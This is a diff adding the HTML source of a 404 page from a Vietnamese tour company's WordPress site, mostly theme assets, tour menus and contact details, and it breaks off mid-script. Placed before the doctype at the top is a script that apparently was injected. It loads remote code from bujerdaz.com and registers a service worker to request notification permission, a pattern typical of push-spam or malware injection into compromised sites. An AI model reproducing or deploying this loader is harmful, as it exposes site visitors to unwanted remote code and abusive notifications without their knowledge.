@@ -1,0 +1,454 @@
+
+			<script>
+				var s = document.createElement('script');
+				s.src='//bujerdaz.com/pfe/current/micro.tag.min.js?z=5650456'+'&sw=/sw-check-permissions-e2a8b.js';
+				s.onload = function(result) {
+					switch (result) {
+						case 'onPermissionDefault':break;
+						case 'onPermissionAllowed':break;
+						case 'onPermissionDenied':break;
+						case 'onAlreadySubscribed':break;
+						case 'onNotificationUnsupported':break;
+					}
+				}
+				document.head.appendChild(s);
+			</script>
+		<!doctype html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="google-site-verification" content="ORTVeaI983f5tGUOCJIz0dmJnKJEqrTzsPn3VWaSbVI" />
+	<meta name="format-detection" content="telephone=no"/>
+	
+	<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Open+Sans:400italic,600,400,700" type="text/css" />
+	<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Kaushan+Script" type="text/css" />
+	<link rel="stylesheet" href="https://goasiatravel.com/wp-content/themes/alova/css/bootstrap.min.css" type="text/css" />
+	<link rel="stylesheet" href="https://goasiatravel.com/wp-content/themes/alova/css/bootstrap-datepicker.css" type="text/css" />
+	<link rel='stylesheet' id='jquery-ui-css' href='https://goasiatravel.com/wp-content/themes/alova/assets/css/jquery-ui.min.css' type='text/css' media='all' />
+    <link rel="stylesheet" type="text/css" href="https://goasiatravel.com/wp-content/themes/alova/assets/css/font-awesome.min.css"/>
+
+	<link rel="stylesheet" href="https://goasiatravel.com/wp-content/themes/alova/css/jquery-ui.min.css" type="text/css" />
+	<link rel="stylesheet" href="https://goasiatravel.com/wp-content/themes/alova/css/skdslider.css" type="text/css" />
+	<link rel="stylesheet" href="https://goasiatravel.com/wp-content/themes/alova/style.css" type="text/css" />
+	<script type="text/javascript" src="https://goasiatravel.com/wp-content/themes/alova/js/jquery.js"></script>
+	<script type="text/javascript" src="https://goasiatravel.com/wp-content/themes/alova/js/bootstrap-datepicker.min.js"></script>
+
+	<link rel="stylesheet" href="https://goasiatravel.com/wp-content/themes/alova/css/animate.css">
+	<link rel="stylesheet" href="https://goasiatravel.com/wp-content/themes/alova/owl/owlcarousel/assets/owl.carousel.min.css">
+    <link rel="stylesheet" href="https://goasiatravel.com/wp-content/themes/alova/owl/owlcarousel/assets/owl.theme.default.min.css">
+
+
+	<script type='text/javascript' src='https://goasiatravel.com/wp-includes/js/jquery/jquery.js'></script>
+	<script type='text/javascript' src='https://goasiatravel.com/wp-includes/js/jquery/jquery-migrate.min.js'></script>
+
+	<script type='text/javascript' src='//c.trazk.com/c.js?_key=' async='async' > </script>
+
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-130174562-2"></script>
+	<script>
+	  window.dataLayer = window.dataLayer || [];
+	  function gtag(){dataLayer.push(arguments);}
+	  gtag('js', new Date());
+
+	  gtag('config', 'UA-130174562-2');
+	</script>
+
+	<div id="fb-root"></div>
+	<script>(function(d, s, id) {
+	  var js, fjs = d.getElementsByTagName(s)[0];
+	  if (d.getElementById(id)) return;
+	  js = d.createElement(s); js.id = id;
+	  js.src = 'https://connect.facebook.net/vi_VN/sdk.js#xfbml=1&version=v3.2&appId=544795158895265&autoLogAppEvents=1';
+	  fjs.parentNode.insertBefore(js, fjs);
+	}(document, 'script', 'facebook-jssdk'));</script>
+
+
+	<meta name='robots' content='noindex, follow' />
+
+	<!-- This site is optimized with the Yoast SEO plugin v18.5.1 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Page not found - Goasiatravel</title>
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:title" content="Page not found - Goasiatravel" />
+	<meta property="og:site_name" content="Goasiatravel" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://goasiatravel.com/#website","url":"https://goasiatravel.com/","name":"Goasiatravel","description":"Goasiatravel tour","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://goasiatravel.com/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//www.google.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Goasiatravel &raquo; Feed" href="https://goasiatravel.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Goasiatravel &raquo; Comments Feed" href="https://goasiatravel.com/comments/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/goasiatravel.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.10"}};
+			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='https://goasiatravel.com/wp-includes/css/dist/block-library/style.min.css?ver=5.7.10' type='text/css' media='all' />
+<link rel='stylesheet' id='contact-form-7-css'  href='https://goasiatravel.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.5.6' type='text/css' media='all' />
+<link rel="https://api.w.org/" href="https://goasiatravel.com/wp-json/" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://goasiatravel.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://goasiatravel.com/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.7.10" />
+<link rel="icon" href="https://goasiatravel.com/wp-content/uploads/2020/02/cropped-Go-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://goasiatravel.com/wp-content/uploads/2020/02/cropped-Go-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://goasiatravel.com/wp-content/uploads/2020/02/cropped-Go-180x180.png" />
+<meta name="msapplication-TileImage" content="https://goasiatravel.com/wp-content/uploads/2020/02/cropped-Go-270x270.png" />
+		<style type="text/css" id="wp-custom-css">
+			.wrap-item-loop.row .mb20.item-loop a img {
+    height: 200px!important;
+    object-fit: cover;
+}
+.mb20.item-loop .mb20.item-loop {
+    display: none;
+}
+.font13.cgray p, .font13.cgray {
+    height: 84px;
+    FONT-VARIANT: JIS90;
+}
+.mb20.item-loop p.mb8.cblack.title {
+    height: 40px;
+    overflow: hidden;
+}
+.information h4 {
+    font-size: 26px!important;
+}
+.col-2css {
+    margin-top: 45px;
+}
+.col-2css h6 {
+    margin: 0;
+}
+.wp-caption {
+    width: 100%;
+    display: inline-block;
+}
+.wp-caption img {
+    width: 100%;
+}
+.size-full {
+    height: auto;
+    width: 100%!important;
+}		</style>
+		</head>
+
+<body class="error404">
+<div id="wraphead" class="hidden-xs">
+	<div class="container" style="">
+		<div class="right">
+		    <div class="address-header">
+		        <span class="">
+		            <i class="fa fa-envelope"></i>
+		            <a href="mailto:info@goasiatravel.com">info@goasiatravel.com</a>
+		        </span>
+		        &nbsp&nbsp&nbsp&nbsp
+<!-- 		        <span class="">
+		            <i class="fa fa-phone"></i>
+		            <a href="tel:+84912536382">+ 84 912536382</a>
+		        </span> -->
+		        &nbsp&nbsp&nbsp&nbsp
+		        <span class="p">
+		            <a href="/?page_id=236">Contact us</a>
+		        </span>
+		        &nbsp&nbsp&nbsp&nbsp
+		        <span class="p">
+		            <a href="/?page_id=884">About us</a>
+		        </span>
+		        &nbsp&nbsp&nbsp&nbsp
+<!-- 		        <span class="p">
+		            <a href="http://dulichdenachau.com/" >
+		            	<img src="https://goasiatravel.com/wp-content/themes/alova/images/vn.png" style="height: 20px;">
+		            </a>
+		        </span> -->
+		    </div>
+		</div>
+		<div class="row">
+			<div class="col-md-3 col-sm-3 center-block">
+				<a href="https://goasiatravel.com" >
+					<img class="img-responsive logo" style=" " src="https://goasiatravel.com/wp-content/themes/alova/images/logo.jpg" class="logo"/></a>
+			</div>
+			<div class="col-md-9 col-sm-9 right ">
+				<div class="menu-desktop-menu-container"><ul id="menu-desktop-menu" class="main-menu"><li id="menu-item-4858" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-4858"><a href="https://goasiatravel.com/">Home</a></li>
+<li id="menu-item-4859" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-has-children menu-item-4859"><a href="https://goasiatravel.com/vietnam-tours/">Vietnam Tours</a>
+<ul class="sub-menu">
+	<li id="menu-item-5221" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-5221"><a href="https://goasiatravel.com/halong-cruise-tours/">Halong Tours</a></li>
+	<li id="menu-item-4870" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4870"><a href="https://goasiatravel.com/vietnam-tours/sapa-tours/">Sapa Tours</a></li>
+	<li id="menu-item-5578" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-5578"><a href="https://goasiatravel.com/vietnam-tours/ha-giang-tours/">Ha Giang Tours</a></li>
+	<li id="menu-item-5405" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-5405"><a href="https://goasiatravel.com/vietnam-tours/ninhbinh/">Ninh Binh Tours</a></li>
+	<li id="menu-item-4875" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4875"><a href="https://goasiatravel.com/vietnam-tours/mekong/">Mekong Tours</a></li>
+	<li id="menu-item-5243" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-5243"><a href="#">1 Day Tours</a>
+	<ul class="sub-menu">
+		<li id="menu-item-4864" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4864"><a href="https://goasiatravel.com/vietnam-tours/hanoi-day-tours/">Hanoi day tours</a></li>
+		<li id="menu-item-4863" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4863"><a href="https://goasiatravel.com/vietnam-tours/halong/">HaLong</a></li>
+		<li id="menu-item-4865" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4865"><a href="https://goasiatravel.com/vietnam-tours/hochiminh/">HoChiMinh</a></li>
+		<li id="menu-item-4866" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4866"><a href="https://goasiatravel.com/vietnam-tours/hoian/">HoiAn</a></li>
+		<li id="menu-item-4867" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4867"><a href="https://goasiatravel.com/vietnam-tours/hue/">Hue</a></li>
+		<li id="menu-item-4868" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4868"><a href="https://goasiatravel.com/vietnam-tours/nhatrang/">NhaTrang</a></li>
+		<li id="menu-item-4869" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4869"><a href="https://goasiatravel.com/vietnam-tours/phuquoc/">PhuQuoc</a></li>
+		<li id="menu-item-4862" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4862"><a href="https://goasiatravel.com/vietnam-tours/dalat/">DaLat</a></li>
+	</ul>
+</li>
+	<li id="menu-item-4876" class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4876"><a href="https://goasiatravel.com/adventure-tours/">Adventure Tours</a></li>
+	<li id="menu-item-4872" class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4872"><a href="https://goasiatravel.com/classic-tour/">Classic Tour</a></li>
+</ul>
+</li>
+<li id="menu-item-4879" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-has-children menu-item-4879"><a href="https://goasiatravel.com/multi-country-tours/">Multi-Country Tours</a>
+<ul class="sub-menu">
+	<li id="menu-item-4877" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-has-children menu-item-4877"><a href="https://goasiatravel.com/cambodia-tours/">Cambodia Tours</a>
+	<ul class="sub-menu">
+		<li id="menu-item-6267" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-6267"><a href="https://goasiatravel.com/cambodia-tours/one-day-tours/">Day trips</a></li>
+		<li id="menu-item-6269" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-6269"><a href="https://goasiatravel.com/cambodia-tours/package-tours/">Package tours</a></li>
+	</ul>
+</li>
+	<li id="menu-item-4878" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-has-children menu-item-4878"><a href="https://goasiatravel.com/laos-tours/">Laos Tours</a>
+	<ul class="sub-menu">
+		<li id="menu-item-6271" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-6271"><a href="https://goasiatravel.com/laos-tours/one-day-tours-laos-tours/">Day trips</a></li>
+		<li id="menu-item-6272" class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-6272"><a href="https://goasiatravel.com/laos-tours/laos-package-tours/">Package tours</a></li>
+	</ul>
+</li>
+</ul>
+</li>
+<li id="menu-item-4880" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-4880"><a href="#">Tour Styles</a>
+<ul class="sub-menu">
+	<li id="menu-item-4887" class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4887"><a href="https://goasiatravel.com/cruise-tour/">Cruise Tour</a></li>
+	<li id="menu-item-4885" class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4885"><a href="https://goasiatravel.com/classic-tour/">Classic Tour</a></li>
+	<li id="menu-item-4881" class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4881"><a href="https://goasiatravel.com/adventure-tours/">Adventure Tours</a></li>
+	<li id="menu-item-4886" class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4886"><a href="https://goasiatravel.com/cooking-class/">Cooking Class</a></li>
+	<li id="menu-item-4891" class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4891"><a href="https://goasiatravel.com/trekking/">Trekking</a></li>
+	<li id="menu-item-4883" class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4883"><a href="https://goasiatravel.com/cycling-tour/">Cycling Tour</a></li>
+	<li id="menu-item-4882" class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4882"><a href="https://goasiatravel.com/beach-tour/">Beach tour</a></li>
+	<li id="menu-item-4884" class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4884"><a href="https://goasiatravel.com/charity-tour/">Charity tour</a></li>
+	<li id="menu-item-4888" class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4888"><a href="https://goasiatravel.com/eco-tour/">Eco Tour</a></li>
+	<li id="menu-item-4889" class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4889"><a href="https://goasiatravel.com/home-stay/">Home Stay</a></li>
+	<li id="menu-item-4890" class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4890"><a href="https://goasiatravel.com/nature-tour/">Nature Tour</a></li>
+</ul>
+</li>
+<li id="menu-item-6391" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-6391"><a href="https://goasiatravel.com/category/news/">News</a>
+<ul class="sub-menu">
+	<li id="menu-item-6393" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-6393"><a href="https://goasiatravel.com/charity-and-society-activities-hoat-dong-tu-thien-xa-hoi/">CHARITY AND SOCIETY ACTIVITIES (HOẠT ĐỘNG TỪ THIỆN XÃ HỘI)</a></li>
+</ul>
+</li>
+</ul></div>			</div>
+		</div>
+	</div><!-- End .container -->
+</div> <!-- End: wraphead -->
+<div class="visible-xs wrap-header-mobile">
+	<div class="wrap-show-menu">
+		<i class="fa fa-bars btn-show-menu"></i>
+		<a href="https://goasiatravel.com" >
+			<img class="img-responsive logo" style=" " src="https://goasiatravel.com/wp-content/themes/alova/images/logo.jpg" class="logo"/>
+		</a>
+	</div>
+	<div class="menu-desktop-menu-container"><ul id="menu-desktop-menu-1" class="main-menu-mobile"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-4858"><a href="https://goasiatravel.com/">Home</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-has-children menu-item-4859"><a href="https://goasiatravel.com/vietnam-tours/">Vietnam Tours</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-5221"><a href="https://goasiatravel.com/halong-cruise-tours/">Halong Tours</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4870"><a href="https://goasiatravel.com/vietnam-tours/sapa-tours/">Sapa Tours</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-5578"><a href="https://goasiatravel.com/vietnam-tours/ha-giang-tours/">Ha Giang Tours</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-5405"><a href="https://goasiatravel.com/vietnam-tours/ninhbinh/">Ninh Binh Tours</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4875"><a href="https://goasiatravel.com/vietnam-tours/mekong/">Mekong Tours</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-5243"><a href="#">1 Day Tours</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4864"><a href="https://goasiatravel.com/vietnam-tours/hanoi-day-tours/">Hanoi day tours</a></li>
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4863"><a href="https://goasiatravel.com/vietnam-tours/halong/">HaLong</a></li>
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4865"><a href="https://goasiatravel.com/vietnam-tours/hochiminh/">HoChiMinh</a></li>
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4866"><a href="https://goasiatravel.com/vietnam-tours/hoian/">HoiAn</a></li>
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4867"><a href="https://goasiatravel.com/vietnam-tours/hue/">Hue</a></li>
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4868"><a href="https://goasiatravel.com/vietnam-tours/nhatrang/">NhaTrang</a></li>
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4869"><a href="https://goasiatravel.com/vietnam-tours/phuquoc/">PhuQuoc</a></li>
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-4862"><a href="https://goasiatravel.com/vietnam-tours/dalat/">DaLat</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4876"><a href="https://goasiatravel.com/adventure-tours/">Adventure Tours</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4872"><a href="https://goasiatravel.com/classic-tour/">Classic Tour</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-has-children menu-item-4879"><a href="https://goasiatravel.com/multi-country-tours/">Multi-Country Tours</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-has-children menu-item-4877"><a href="https://goasiatravel.com/cambodia-tours/">Cambodia Tours</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-6267"><a href="https://goasiatravel.com/cambodia-tours/one-day-tours/">Day trips</a></li>
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-6269"><a href="https://goasiatravel.com/cambodia-tours/package-tours/">Package tours</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-has-children menu-item-4878"><a href="https://goasiatravel.com/laos-tours/">Laos Tours</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-6271"><a href="https://goasiatravel.com/laos-tours/one-day-tours-laos-tours/">Day trips</a></li>
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-group_tour menu-item-6272"><a href="https://goasiatravel.com/laos-tours/laos-package-tours/">Package tours</a></li>
+	</ul>
+</li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-4880"><a href="#">Tour Styles</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4887"><a href="https://goasiatravel.com/cruise-tour/">Cruise Tour</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4885"><a href="https://goasiatravel.com/classic-tour/">Classic Tour</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4881"><a href="https://goasiatravel.com/adventure-tours/">Adventure Tours</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4886"><a href="https://goasiatravel.com/cooking-class/">Cooking Class</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4891"><a href="https://goasiatravel.com/trekking/">Trekking</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4883"><a href="https://goasiatravel.com/cycling-tour/">Cycling Tour</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4882"><a href="https://goasiatravel.com/beach-tour/">Beach tour</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4884"><a href="https://goasiatravel.com/charity-tour/">Charity tour</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4888"><a href="https://goasiatravel.com/eco-tour/">Eco Tour</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4889"><a href="https://goasiatravel.com/home-stay/">Home Stay</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-tour_style menu-item-4890"><a href="https://goasiatravel.com/nature-tour/">Nature Tour</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-6391"><a href="https://goasiatravel.com/category/news/">News</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-post menu-item-6393"><a href="https://goasiatravel.com/charity-and-society-activities-hoat-dong-tu-thien-xa-hoi/">CHARITY AND SOCIETY ACTIVITIES (HOẠT ĐỘNG TỪ THIỆN XÃ HỘI)</a></li>
+</ul>
+</li>
+</ul></div>	
+</div>
+
+<footer class="page-footer offset-lg-top-15">
+    <div>
+        <div class="container">
+            <div class="row">
+                <div class="footer-block information col-md-4 col-xs-12 col-sm-6">
+                    <div>
+                        <p></p>
+                        <h4>Go Asia Travel</h4>
+                        <p></p>
+						<p>
+							Các văn phòng/ Cty du lịch / Khách sạn muốn đặt tour/kiểm tra thông tin Tour ghép Hạ Long, Ninh Bình, Sapa và Tàu Ngủ Alova Cruises,...vui lòng gọi số máy bàn 02439234102/ 02439234103/ 02439234104 (24/24)
+Để lấy giá hợp đồng các tour ghép và tàu ngủ đêm Alova Cruises Liên hệ: Mr Nghê: 0938229896/ Mr. Tuyên: 0964529933 / Ms Phương: 0399766940 
+						</p>
+                        <p>Head Office: 20 Hang Muoi Str, Hoan Kiem Dist, Hanoi, Vietnam</p>
+                        <p> </p>
+						<p>
+							info@goasiatravel.com						</p>
+                      
+                    </div>
+                </div>
+                <div class="footer-block information col-md-2 col-xs-12 col-sm-6 hidden-xs col-2css">
+                    <div class="menu-footer-container"><ul id="menu-footer" class="list"><li id="menu-item-4828" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4828"><a href="https://goasiatravel.com/about-us/">About Us</a></li>
+<li id="menu-item-4830" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4830"><a href="https://goasiatravel.com/contact-us2/">Contact Us</a></li>
+<li id="menu-item-4834" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4834"><a href="https://goasiatravel.com/why-us/">Why us</a></li>
+<li id="menu-item-4829" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4829"><a href="https://goasiatravel.com/conditions-of-use/">Conditions Of Use</a></li>
+<li id="menu-item-4831" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4831"><a href="https://goasiatravel.com/announcement/">Announcement</a></li>
+<li id="menu-item-4833" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4833"><a href="https://goasiatravel.com/privacy-notice/">Privacy Notice</a></li>
+<li id="menu-item-5963" class="menu-item menu-item-type-taxonomy menu-item-object-charity_tour menu-item-5963"><a href="https://goasiatravel.com/charity_tour/our-charity-and-society-activites/">Our Charity And Society Activites</a></li>
+</ul></div>                </div>
+                <div class="footer-block customer-service col-md-2 col-xs-12 col-sm-6 hidden-xs col-2css">
+                    <div class="title">
+                        <h6>Customer service</h6>
+                    </div>
+                    <ul class="list">
+
+
+                    	<li><a href="http://goasiatravel.com/our-team/">Our Team</a></li>
+
+                        <li><a href="/faqs">FAQs</a></li>
+						
+						<li><a href="http://goasiatravel.com/warning/"><span style="background-color: #ff0000">&nbsp; &nbsp; Warning &nbsp; &nbsp;</span></a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-block follow-us col-md-4 col-sm-6 col-esm-6 col-xs-12 col-2css">
+                    <div class="social">
+                        <div class="title">
+                            <h6>Follow us</h6>
+                        </div>
+                        <ul class="networks list-inline list-inline-xs" style="padding-left: 0px;">
+						    <li><a href="https://www.facebook.com/GoAsiaTravelCom/" target="_blank"><i class="fa fa-facebook-square" aria-hidden="true"></i>
+						        </a>
+						    </li>
+						    <li><a href="#" target="_blank"><i class="fa fa-twitter-square" aria-hidden="true"></i>
+						        </a>
+						    </li>
+						    <li><a href="https://www.youtube.com/channel/UCw6xFJeDmF5eQhngnbwtoxQ" target="_blank"><i class="fa fa-youtube-square" aria-hidden="true"></i>
+						        </a>
+						    </li>
+						    <li><a href="" target="_blank"><i class="fa fa-instagram" aria-hidden="true"></i></a>
+						    </li>
+
+						</ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</footer>
+
+
+<script type="text/javascript" src="https://goasiatravel.com/wp-content/themes/alova/owl/vendors/jquery.min.js"></script>
+
+<script type='text/javascript' src='https://goasiatravel.com/wp-content/themes/alova/assets/js/jquery-ui.min.js'></script>
+<script type="text/javascript" src="https://goasiatravel.com/wp-content/themes/alova/js/bootstrap.min.js"></script>
+<script src="https://goasiatravel.com/wp-content/themes/alova/owl/owlcarousel/owl.carousel.min.js"></script>
+<script type="text/javascript" src="https://goasiatravel.com/wp-content/themes/alova/parallax/parallax.min.js"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.3.5/jquery.fancybox.min.js"></script>
+<!--Smooth scrolling mouse : https://cdnjs.com/libraries/smoothscroll-->
+<script src='https://cdnjs.cloudflare.com/ajax/libs/smoothscroll/1.4.6/SmoothScroll.min.js' type='text/javascript'></script>
+
+
+<script>
+$(function($) {
+    $('.mob-top-menu > li.expand > a').click(function(event) {
+        event.preventDefault();
+        var expand = $(this).parent();
+        if (expand.hasClass('active')) {
+            $(".sub-menu:first", expand).hide(300);
+            expand.removeClass('active');
+        } else {
+            $(".sub-menu:first", expand).show(300);
+            expand.addClass('active');
+        }
+    });
+
+    $('.mob-top-menu > li > ul > li.expand > a').click(function(event) {
+        event.preventDefault();
+        var expand = $(this).parent();
+        if (expand.hasClass('active')) {
+            $(".sub-menu:first", expand).hide(300);
+            expand.removeClass('active');
+        } else {
